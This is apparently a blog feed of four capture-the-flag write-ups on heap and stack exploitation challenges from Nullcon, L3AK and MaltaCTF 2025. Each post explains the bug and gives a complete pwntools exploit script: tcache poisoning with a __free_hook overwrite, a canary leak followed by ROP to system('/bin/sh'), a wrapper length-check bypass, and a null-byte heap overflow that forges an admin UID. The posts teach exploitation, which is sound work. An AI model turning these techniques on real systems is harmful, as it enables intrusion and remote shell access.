[{"content":"Fotispy6 â€“ Nullcon CTF 2025\rOverview\rThis binary was a classic heap-based program where we could add multiple songs and comments, as well as view and delete them. Protections enabled were: PIE, Canary, NX, and Full RELRO. Initially, I spent quite some time trying to figure out the exploitation strategy. Then, I randomly checked the libc version and noticed it was 2.31 so there was no pointer mangling(safe linking) in tcache and __free_hook function was also present in this libc.\nReversed Code\rmain add edit view delete Exploitation Plan\rAs the code doesnâ€™t remove the pointer from the list after freeing, there is a UAF vuln. I first leaked libc through an unsorted bin.\n1 2 3 4 5 6 7 8 addsong(b\u0026#39;a\u0026#39;,1300) #0 addsong(b\u0026#39;b\u0026#39;,1300) #1 delete(0) view(0) leak=u64(p.recvline()[:-1].ljust(8,b\u0026#39;\\x00\u0026#39;)) log.critical(f\u0026#34;leak : {leak:#x}\u0026#34;) libcbase=leak-0x1ecbe0 libc.address=libcbase b is a guard chunk so that when the first chunk goes into the unsorted bin it doesnâ€™t get consolidated with the wilderness. After freeing the first chunk, its fd pointer contains the address of the main arena head, which is a libc address. So i leaked this and calculated the libc base.\nFor __free_hook I used tcache poisoning by changing the fd of a tcache chunk to point to __free_hook. Since thereâ€™s no safe-linking, I could directly overwrite the fd without mangling.\n1 2 3 4 5 6 7 8 9 10 11 freehook=libc.symbols[\u0026#39;__free_hook\u0026#39;] system=libc.symbols[\u0026#39;system\u0026#39;] binsh=next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) addsong(b\u0026#39;c\u0026#39;,8) #2 addsong(b\u0026#39;d\u0026#39;,8) #3 delete(2) delete(3) edit(3,8,p64(freehook)) addsong(b\u0026#39;e\u0026#39;,8) #4 addsong(p64(system),8) #5 After getting the chunk , i wrote the address of system in __free_hook , so that whenever free is called it will call system with the same argument the free was called on. At last i just add another chunk and free it to execute the exploit.\n1 2 addsong(b\u0026#39;/bin/sh\u0026#39;,20) #6 delete(6) Full Exploit Script\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 #!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;./fotispy6_patched\u0026#34;, checksec=False) libc = ELF(\u0026#34;./libc.so.6\u0026#34;, checksec=False) ld = ELF(\u0026#34;./ld-2.31.so\u0026#34;, checksec=False) context.binary = exe #context.log_level = \u0026#39;debug\u0026#39; def conn(): if args.LOCAL: r = process([exe.path]) if args.DEBUG: gdb.attach(r) else: r = remote(\u0026#34;52.59.124.14\u0026#34;, 5196) return r def addsong(comment, size): p.sendlineafter(b\u0026#39;[~] Choice: \u0026#39;, b\u0026#39;2\u0026#39;) p.sendlineafter(b\u0026#39;[~] How long will the comment be: \u0026#39;, str(size).encode()) p.sendlineafter(b\u0026#39;[~] Enter the comment: \u0026#39;, comment) def edit(idx, newsize, comment): p.sendlineafter(b\u0026#39;[~] Choice: \u0026#39;, b\u0026#39;3\u0026#39;) p.sendlineafter(b\u0026#39;[~] Which song to you want to select: \u0026#39;, str(idx).encode()) p.sendlineafter(b\u0026#39;[~] How long will the new comment be: \u0026#39;, str(newsize).encode()) p.sendlineafter(b\u0026#39;[~] Enter the new comment: \u0026#39;, comment) def view(idx): p.sendlineafter(b\u0026#39;[~] Choice: \u0026#39;, b\u0026#39;4\u0026#39;) p.sendlineafter(b\u0026#39;[~] Which song to you want to select: \u0026#39;, str(idx).encode()) p.recvuntil(b\u0026#39;[+] Here is your comment:\\n\u0026#39;) def delete(idx): p.sendlineafter(b\u0026#39;[~] Choice: \u0026#39;, b\u0026#39;5\u0026#39;) p.sendlineafter(b\u0026#39;[~] Which song to you want to select: \u0026#39;, str(idx).encode()) p = conn() # Leak libc addsong(b\u0026#39;a\u0026#39;,1300) #0 addsong(b\u0026#39;b\u0026#39;,1300) #1 delete(0) view(0) leak = u64(p.recvline()[:-1].ljust(8,b\u0026#39;\\x00\u0026#39;)) log.critical(f\u0026#34;leak : {leak:#x}\u0026#34;) libcbase = leak - 0x1ecbe0 libc.address = libcbase log.critical(f\u0026#34;libcbase : {libcbase:#x}\u0026#34;) # Ovewriting __free_hook freehook = libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc.symbols[\u0026#39;system\u0026#39;] binsh = next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) log.critical(f\u0026#34;freehook : {freehook:#x}\u0026#34;) log.critical(f\u0026#34;system : {system:#x}\u0026#34;) log.critical(f\u0026#34;binsh : {binsh:#x}\u0026#34;) # Tcache poisoning addsong(b\u0026#39;c\u0026#39;,8) #2 addsong(b\u0026#39;d\u0026#39;,8) #3 delete(2) delete(3) edit(3, 8, p64(freehook)) addsong(b\u0026#39;e\u0026#39;,8) #4 addsong(p64(system),8) #5 # Trigger exploit addsong(b\u0026#39;/bin/sh\u0026#39;,20) #6 delete(6) p.interactive() Result\r","date":"2025-09-06T00:00:00Z","permalink":"https://velobobo.github.io/blog/post/nullcon-2025-chunkythreads/","title":"NullConCTF 2025 - Fotispy6"},{"content":"ChunkyThreads â€“ l3akCTF 2025\rOverview\rThis binary has no pie but all other protections. it uses different threads to print out data , first we have to set the max number of threads by CHUNKS \u0026lt;num\u0026gt; threads can be upto 10. then we can enter a cmd like CHUNK \u0026lt;sleep_time\u0026gt; \u0026lt;repeat\u0026gt; \u0026lt;data\u0026gt; which uses a thread to print out data and then wait for sleep_time and print again till the data is printed \u0026lt;repeat\u0026gt; times. The data is stored in a buffer on stack and can be of any length.\nReversed code\rmain parsecmd print Exploitation Plan\rAs the binary first puts and then goes to sleep , we can use a thread to leak stack canary by overwriting till the canary\u0026rsquo;s null byte and then puts will leak it and we also provide a big sleep value so that the thread doesn\u0026rsquo;t execute stach_chk_fail.\n1 2 3 4 5 6 payload=b\u0026#39;CHUNK 100 1 \u0026#39; +b\u0026#39;A\u0026#39;*0x49 p.send(payload) p.recvuntil(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;) canary=b\u0026#39;\\x00\u0026#39;+p.recv(7) canary=u64(canary.ljust(8,b\u0026#39;\\x00\u0026#39;)) log.critical(f\u0026#39;Canary : {hex(canary)}\u0026#39;) Then we use other thread to rop , but the binary had no pop rdi gadget , so we had to rop from libc but for that we had to get libcbase. I was stuck here but then i just examined in gdb where the print function was returning to , i thought it would return in the binary but it was returning to a libc address. I didn\u0026rsquo;t try to find the reason but maybe cuz threads came into play??? So then i leaked this like the same way i leaked the canary and then calculated the offset of this leaked libc address from the libcbase and hardcoded this offset as it will not change. At last we just call system(/bin/sh) and put the sleep time less as we want this to exit before the other 2 threads execute stack_chk_fails\nLater found out that thread was started by pthread_create which is a libc function so the thread was returning inside this function after termination. thats why i saw print return to a libc address and not a binary address.\nFull exploit script\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from pwn import * binary=\u0026#39;./chall_patched\u0026#39; elf = context.binary = ELF(binary, checksec=False) #context.log_level=\u0026#39;debug\u0026#39; libc=ELF(\u0026#39;./libc.so.6\u0026#39;,checksec=False) #p=process(binary) #gdb.attach(p) p=remote(\u0026#34;34.45.81.67\u0026#34;,16006) p.clean() p.send(b\u0026#39;CHUNKS 8 \u0026#39;) # setting max threads value p.recvline() p.clean() payload=b\u0026#39;CHUNK 100 1 \u0026#39; +b\u0026#39;A\u0026#39;*0x49 p.send(payload) p.recvuntil(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;) canary=b\u0026#39;\\x00\u0026#39;+p.recv(7) canary=u64(canary.ljust(8,b\u0026#39;\\x00\u0026#39;)) log.critical(f\u0026#39;Canary : {hex(canary)}\u0026#39;) payload=b\u0026#39;CHUNK 100 1 \u0026#39; +b\u0026#39;A\u0026#39;*88 p.send(payload) p.recvuntil(b\u0026#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\u0026#39;) libcaddr=p.recv(6) libcbase=u64(libcaddr.ljust(8,b\u0026#39;\\x00\u0026#39;))-0x9caa4 log.critical(f\u0026#39;Libcaddr : {hex(libcbase+0x9caa4)}\u0026#39;) log.critical(f\u0026#39;Libcbase : {hex(libcbase)}\u0026#39;) libc.address=libcbase poprdi=libcbase+0x000000000010f75b binsh=libcbase+0x1cb42f system=libcbase+0x58750 log.critical(f\u0026#39;poprdi : {hex(poprdi)}\u0026#39;) log.critical(f\u0026#39;binsh : {hex(binsh)}\u0026#39;) log.critical(f\u0026#39;system : {hex(system)}\u0026#39;) p.clean() payload=b\u0026#39;CHUNK 1 1 \u0026#39; +b\u0026#39;A\u0026#39;*0x48 + p64(canary) +b\u0026#39;B\u0026#39;*8 + p64(poprdi) + p64(binsh) +p64(0x000000000040101a) +p64(system) p.send(payload) p.interactive() Result\rAlso i had to type cmds two times for it to execute on the shell , thats cuz now my input is shared by both the main process(which has 2 threads running) and also my newly exceeded shell.\n","date":"2025-07-12T00:00:00Z","permalink":"https://velobobo.github.io/blog/post/l3ak-2025-chunkythreads/","title":"L3AKCTF 2025 - ChunkyThreads"},{"content":"SafeGets â€“ l3akCTF 2025\rOverview\rThe original binary was rather simple using gets() to read data into buffer and then printing the reversed string of buffer via puts , it had a win function too. it had no canary , no pie , nx on . so it was clear what we needed to do . but there was a wrapper.py which was first checking if our input is less than 255 bytes and then only executing the binary with out input.\nCode \u0026amp; wrapper.py\rwrapper.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import subprocess import sys BINARY = \u0026#34;./chall\u0026#34; MAX_LEN = 0xff # Get input from user payload = input(f\u0026#34;Enter your input (max {MAX_LEN} bytes): \u0026#34;) if len(payload) \u0026gt; MAX_LEN: print(\u0026#34;[-] Input too long!\u0026#34;) sys.exit(1) # Start the binary with pipes proc = subprocess.Popen( [BINARY], stdin=subprocess.PIPE, stdout=sys.stdout, stderr=subprocess.PIPE ) code\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 undefined8 main(void) { size_t sVar1; char buffer [259]; char local_15; int local_14; ulong i; gets(buffer); sVar1 = strlen(buffer); local_14 = (int)sVar1; for (i = 0; i \u0026lt; (ulong)(long)(local_14 / 2); i = i + 1) { local_15 = buffer[(long)(local_14 + -1) - i]; buffer[(long)(local_14 + -1) - i] = buffer[i]; buffer[i] = local_15; } puts(\u0026#34;Reversed string:\u0026#34;); puts(buffer); return 0; } Exploitation Plan\rIf we don\u0026rsquo;t consider wrapper.py then it was just buffer overflow and overwriting the return address to the win function. And also to bypass the reversing of our payload we can just add a null byte in front of our payload as strlen just checks the input till null byte and with this the reversing will not happen as it will think the len is 0 , and this input is also read with read() so it will continue to read even if it encounters a null byte. But the offset to the return address was more than 255 bytes , so wee somehow had to bypass wrapper.py\nso after a bit of searching i found out python\u0026rsquo;s len treats emojis, Chinese characters etc which are in utf-8 encoding as 1 but in actual bytes they can reach many bytes.\nso i just had to use a emoji as a garbage value to fill up the stack instead of normal characters , that would bypass the len check\nExploit script\r1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * binary=\u0026#39;./chall\u0026#39; elf = context.binary = ELF(binary, checksec=False) #p=process(binary) p=remote(\u0026#34;34.45.81.67\u0026#34;,16002) p.recvuntil(b\u0026#39;t (max 255 bytes):\u0026#39;) #gdb.attach(p) payload=b\u0026#39;\\x00\u0026#39;+(\u0026#34;ðŸ’€\u0026#34;*69).encode(\u0026#34;utf-8\u0026#34;) +b\u0026#39;AAA\u0026#39;+p64(0x40101a)+p64(0x401262) p.sendline(payload) p.interactive() Result\r","date":"2025-07-12T00:00:00Z","permalink":"https://velobobo.github.io/blog/post/l3ak-2025-safegets/","title":"L3AKCTF 2025 - SafeGets"},{"content":"Challenge: login â€“ MaltaCTF 2025\rThis was a heap challenge with a subtle bug in a snprintf() call that allows a heap-based null byte overwrite, giving us a path to become the admin and read the flag.\nOverview\rThe binary simulates a simple multi-user system with features to:\nCreate and delete users View and select a current user Log in as the admin user to get the flag Only the user with UID 0 (i.e. the admin) can access the flag.\nSource Code\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define NAME_LEN 0x24 #define BIO_LEN 0x30 #define USER_COUNT 0x10 #define ADMIN_UID 0 #define USER_UID 1 typedef struct user { unsigned int uid; char name[NAME_LEN]; char bio[BIO_LEN]; } user_t; unsigned int curr_uid = 1000; user_t admin; user_t* users[USER_COUNT]; unsigned int current_user; int getint(const char* msg) { printf(msg); char buf[0x8] = {}; int choice = -1; read(0, buf, sizeof(buf)); return atoi(buf); } int menu() { printf(\u0026#34;1) Create user\\n\u0026#34;); printf(\u0026#34;2) Select user\\n\u0026#34;); printf(\u0026#34;3) Print users\\n\u0026#34;); printf(\u0026#34;4) Delete user\\n\u0026#34;); printf(\u0026#34;4) Login\\n\u0026#34;); printf(\u0026#34;5) Exit\\n\u0026#34;); return getint(\u0026#34;\u0026gt; \u0026#34;); } int create() { int idx = -1; int ret = -1; char namebuf[NAME_LEN] = {}; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } users[idx] = calloc(1, sizeof(user_t)); users[idx]-\u0026gt;uid = curr_uid++; printf(\u0026#34;Enter user name.\\n\u0026gt; \u0026#34;); ret = read(0, users[idx]-\u0026gt;name, NAME_LEN - 1); if (ret \u0026lt; 0) { printf(\u0026#34;Failed to read user name!\\n\u0026#34;); free(users[idx]); users[idx] = NULL; return -1; } users[idx]-\u0026gt;name[ret-1] = \u0026#39;\\0\u0026#39;; ret = snprintf(users[idx]-\u0026gt;bio, BIO_LEN - 1, \u0026#34;%s is a really cool hacker\\n\u0026#34;, users[idx]-\u0026gt;name); if (ret \u0026lt; 0) { printf(\u0026#34;Failed to create user bio\\n\u0026#34;); free(users[idx]); users[idx] = NULL; return -1; } users[idx]-\u0026gt;bio[ret-1] = \u0026#39;\\0\u0026#39;; return 0; } int select_user() { int idx = -1; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT || !users[idx]) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } current_user = idx; return 0; } int delete_user() { int idx = -1; printf(\u0026#34;Enter user index.\\n\u0026#34;); idx = getint(\u0026#34;\u0026gt; \u0026#34;); if (idx \u0026lt; 0 || idx \u0026gt;= USER_COUNT || !users[idx]) { printf(\u0026#34;Invalid user index!\\n\u0026#34;); return -1; } free(users[idx]); users[idx] = NULL; return 0; } void print_users() { for (int i = 0; i \u0026lt; USER_COUNT; i++) { if (!users[i]) continue; printf(\u0026#34;User %d\\n\u0026#34;, i); printf(\u0026#34;UID : %u\\n\u0026#34;, users[i]-\u0026gt;uid); printf(\u0026#34;Name: %s\\n\u0026#34;, users[i]-\u0026gt;name); printf(\u0026#34;Bio : %s\\n\\n\u0026#34;, users[i]-\u0026gt;bio); } } int login() { if (users[current_user] \u0026amp;\u0026amp; users[current_user]-\u0026gt;uid == ADMIN_UID) { int fd = open(\u0026#34;flag.txt\u0026#34;, O_RDONLY); char buf[0x100] = {}; if (fd \u0026lt; 0) { printf(\u0026#34;Flag file does not exist.. if this is on remote, contact an admin.\\n\u0026#34;); return -1; } read(fd, buf, 0x100); printf(\u0026#34;Hi admin, here is your flag: %s\\n\u0026#34;, buf); return 0; } else { printf(\u0026#34;You don\u0026#39;t have permission to do that....\\n\u0026#34;); return -1; } } void setup() { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); setvbuf(stderr, 0, 2, 0); } int main(void) { setup(); admin.uid = 0; strcpy(admin.name, \u0026#34;admin\u0026#34;); while (1) { int choice = menu(); switch (choice) { case 1: if (create() \u0026lt; 0) { printf(\u0026#34;Failed to create user!\\n\u0026#34;); } break; case 2: if (select_user() \u0026lt; 0) { printf(\u0026#34;Failed to create user!\\n\u0026#34;); } break; case 3: print_users(); break; case 4: if (delete_user() \u0026lt; 0) { printf(\u0026#34;Failed to delete user!\\n\u0026#34;); } break; case 5: if (login() \u0026lt; 0) { printf(\u0026#34;Failed to login!\\n\u0026#34;); } break; case 6: return 0; break; default: printf(\u0026#34;Invalid choice.\\n\u0026#34;); break; } } } Vulnerability\rThe vulnerability lies in this part of the create() function:\n1 2 ret = snprintf(users[idx]-\u0026gt;bio, BIO_LEN - 1, \u0026#34;%s is a really cool hacker\\n\u0026#34;, users[idx]-\u0026gt;name); users[idx]-\u0026gt;bio[ret - 1] = \u0026#39;\\0\u0026#39;; Hereâ€™s whatâ€™s wrong:\nsnprintf() returns the total number of characters it would have written, even if the output is truncated. If the name input is long, ret will be larger than BIO_LEN, and bio[ret - 1] = '\\0' will write a null byte out of bounds into the next chunkâ€™s memory. That gives us a heap-based null byte overflow primitive.\nExploitation Plan\rWe want to Exploit the overflow to null out part of a neighboring userâ€™s uid.\nBut we face a challenge: the name field can only hold 34 bytes (actually 35 bytes but the last byte is null byte and when we pass it into the %s for blog text it takes only the bytes before the null byte)\nThe suffix \u0026quot; is a really cool hacker\\n\u0026quot; is 25 bytes. That means ret=snprintf() maxes out at 34 + 25 = 59 =\u0026gt; ret-1=58 â€” so we can only overwrite at a maximum offset 58 from the start of bio.\nLetâ€™s understand memory layout:\n1 2 user_t (from calloc) =\u0026gt; 0x60 bytes chunk [ uid 4 bytes | name 36 bytes | bio 48 bytes ] If two user_t chunks are next to each other:\n1 2 Chunk 1: [prev-size][size][uid][name][bio] Chunk 2: [prev-size][size][uid][name][bio] But as prev-size field of next chunk is usable memory for the chunk before it so we have the structure like\n1 [prev-chunk bio][next-chunk size][next-chunk uid] At start uid=1000=0x3E8\n1 2 E8 03 00 00 bio[59] bio[58] bio[57] bio[56] so we can only overwrite this 3rd nibble 03 , so this doesnt solve our problem. One thing we can do is if we create more users till our target uid=0x400=1024 , 00 04 00 00 then we can achieve uid=0 by overwriting the 3rd nibble only\nSo if we can:\nArrange two adjacent chunks, Overflow bio[58], And ensure the target UID is 0x00000400 (00 04 00 00), Then overwriting bio[58]= 0x00 makes it â†’ 00 00 00 00 (UID 0 = admin) Heap Feng Shui\rAs calloc doesnt allocate chunks from tcache , we first have to fill tcache so that the next freed entry goes to fastbin and then we can achieve ptr reuse by using the chunk from fastbin To place chunks adjacently, we:\nFill the tcache bin for size 0x60 (7 entries). Force freed chunks to go into fastbin. Use Use-After-Free (UAF) behavior to allocate a chunk adjacent to another. Exploit Script\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * p = remote(\u0026#34;login.shared.challs.mt\u0026#34;, 1337) uid = 999 def adduser(index, name): global uid p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) # Create user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(index) p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.send(name) uid += 1 print(f\u0026#34;[+] Added user {uid}\u0026#34;) def deleteuser(index): p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;4\u0026#39;) # Delete user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(index) # Fill tcache bin for i in range(7): adduser(b\u0026#39;0\u0026#39;, b\u0026#39;abc\u0026#39;) deleteuser(b\u0026#39;0\u0026#39;) # Push UID counter up to 1024 (0x400) while uid \u0026lt;= 1021: adduser(b\u0026#39;0\u0026#39;, b\u0026#39;abc\u0026#39;) deleteuser(b\u0026#39;0\u0026#39;) # Create user with uid=1024 adduser(b\u0026#39;0\u0026#39;, b\u0026#39;A\u0026#39;) # This should be UID=1023 adduser(b\u0026#39;1\u0026#39;, b\u0026#39;BBBBBBBBB\u0026#39;) # This should be UID=1024 deleteuser(b\u0026#39;0\u0026#39;) # Free the first # Trigger the overflow â€” overwrite byte at bio[58] to null out UID=1024 â†’ UID=0 adduser(b\u0026#39;0\u0026#39;, b\u0026#39;A\u0026#39;*34) # Now user at index 1 should be UID=0 (admin), so select and login p.sendline(b\u0026#39;2\u0026#39;) # Select user p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.sendline(b\u0026#39;5\u0026#39;) # Login p.interactive() Result\r","date":"2025-06-22T00:00:00Z","permalink":"https://velobobo.github.io/blog/post/malta-2025-login/","title":"MaltaCTF 2025 - Login"}]